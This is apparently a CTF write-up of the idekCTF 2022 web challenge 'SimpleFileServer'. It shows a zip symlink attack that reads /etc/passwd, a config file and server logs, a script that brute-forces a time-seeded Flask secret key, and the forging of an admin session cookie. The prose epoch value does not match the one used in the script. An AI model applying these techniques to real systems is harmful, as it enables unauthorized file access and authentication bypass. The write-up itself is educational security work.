---
title: "idekCTF 2022: SimpleFileServer"
date: 2023-01-19T17:58:00+08:00
draft: false
author: "Jack Sun"
tags:
  - Cybersecurity
  - CTFs
  - Writeups
  - idekCTF
  - idekCTF 2022
  - Web
image: /images/writeups/idekCTF2022/banner.png
---

## Description

- Name: SimpleFileServer
- Category: Web
- 448 pts, 98 solves
- Written by `JW#9396`

All I wanted was a website letting me host files anonymously for free, for ever
{{%attachments style="orange" /%}}

## Solution

Analysing the codebase that we have been provided, it is clear that we need to read the flag by either calling the `/flag` route, or exploiting the code logic to perform an arbitrary file read or some sort of remote code execution.

To be able to extract the flag from the `/flag` route, we must first have admin set to `True` in our session cookie.

```python
@app.route("/flag")
def flag():
    if not session.get("admin"):
        return "Unauthorized!"
    return subprocess.run("./flag", shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
```

The `/upload` route contains some interesting code that makes use of `unzip`.

```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    if not session.get("uid"):
        return redirect("/login")
    if request.method == "GET":
        return render_template("upload.html")

    if "file" not in request.files:
        flash("You didn't upload a file!", "danger")
        return render_template("upload.html")
    
    file = request.files["file"]
    uuidpath = str(uuid.uuid4())
    filename = f"{DATA_DIR}uploadraw/{uuidpath}.zip"
    file.save(filename)
    subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"])    
    flash(f'Your unique ID is <a href="/uploads/{uuidpath}">{uuidpath}</a>!', "success")
    logger.info(f"User {session.get('uid')} uploaded file {uuidpath}")
    return redirect("/upload")
```

`unzip` is vulnerable to a [symlink attack](https://effortlesssecurity.in/2020/08/05/zip-symlink-vulnerability/), which allows us to perform arbitrary file reads. To exploit this, we can upload a zip file containing a symlink to the path of the file we want to read. Then, we can call the `/uploads/{uuidpath}/{symlink}` route to read the file.

As a proof of concept, I created a zip archive with a file called `poc` relatively symlinked to `/etc/passwd`.

![symlink_poc](/images/writeups/idekCTF2022/simple_file_server/symlink_poc.png)

Then, I created an account `a:a`, and uploaded the zip file.

![upload](/images/writeups/idekCTF2022/simple_file_server/upload.png)

We can call the `/uploads/{uuidpath}/poc` route to read the symlinked `passwd` file.

![passwd](/images/writeups/idekCTF2022/simple_file_server/passwd.png)

It works!

![passwd_content](/images/writeups/idekCTF2022/simple_file_server/passwd_content.png)

Unfortunately, we cannot directly read the flag file as we do not have the correct permissions to do so. From the Dockerfile, the flag is protected with permission `600` as root, while we are set to the user `nobody`. Hence, the flag must be read by the privileged `flag` binary with permission `4755`.

Thus, we need to forge a session cookie with the `admin` claim set to `True`, so we can call the `/flag` route to read the flag.

To forge a session cookie, we need to know the secret key. The secret key is generated using a PRNG in this case with the seed dependent on the time at which the server is first run, and a secret offset.

We can use the symlink vulnerability to read `/app/config.py`. From this, we find that the secret offset is `-67198624`.

```python
import random
import os
import time

SECRET_OFFSET = -67198624
random.seed(round((time.time() + SECRET_OFFSET) * 1000))
os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
```

From the Dockerfile, we can see that the log for the server is stored at `/tmp/server.log`. Reading this reveals the timestamp at which the server was first run.

```text
[2023-01-19 09:01:04 +0000] [7] [INFO] Starting gunicorn 20.1.0
[2023-01-19 09:01:04 +0000] [7] [INFO] Listening at: http://0.0.0.0:1337 (7)
[2023-01-19 09:01:04 +0000] [7] [INFO] Using worker: sync
[2023-01-19 09:01:04 +0000] [11] [INFO] Booting worker with pid: 11
[2023-01-19 09:01:48 +0000] [7] [CRITICAL] WORKER TIMEOUT (pid:11)
[2023-01-19 09:01:48 +0000] [11] [INFO] Worker exiting (pid: 11)
[2023-01-19 09:01:48 +0000] [12] [INFO] Booting worker with pid: 12
```

Python's `time.time()` is formatted in epoch time. We can use a [Epoch converter](https://www.unixtimestamp.com/index.php) to convert our timestamp to epoch time. After converting, we find that `1674090064` is the epoch timestamp at which the server was first run.

With these 2 pieces of information, we can use [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign) to find the secret key.

We first need to extract the session cookie using our web browser's developer tools.

![cookie](/images/writeups/idekCTF2022/simple_file_server/cookie.png)

```text
session: eyJhZG1pbiI6ZmFsc2UsInVpZCI6ImEifQ.Y8kHKg.EjogaJiiVKpA_Z-QR6JpvRJoYz8
```

Now, we must account for the possibility that the secret key is not generated at the exact time that the server started according the logs. Thus, we need to generate a dictionary of the possible secret keys with small varying offsets, and then use Flask Unsign to brute force the actual secret key.

I wrote a simple script to generate the dictionary:

```python
import random

SECRET_OFFSET = -67198624
TIME = 	1674118864

for t in range(-10000, 10000):
    random.seed(round((TIME + t/1000 + SECRET_OFFSET) * 1000))
    secret = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
    print(secret)
```

This is executed with `python exploit.py > dictionary.txt`

We then run Flask Unsign using the dictionary to find the secret key.

We get the secret key as `33ca3257fd2b30d86a154ac1c15c966d`.

![secret](/images/writeups/idekCTF2022/simple_file_server/secret.png)

With the secret key, we can now sign a session cookie with the `admin` claim set to `True`.

![forged](/images/writeups/idekCTF2022/simple_file_server/forged.png)

Now we can set the session cookie in the web browser to the one we forged, and visit `/flag` to read the flag.

![flag](/images/writeups/idekCTF2022/simple_file_server/flag.png)

Flag: `idek{s1mpl3_expl01t_s3rver}`
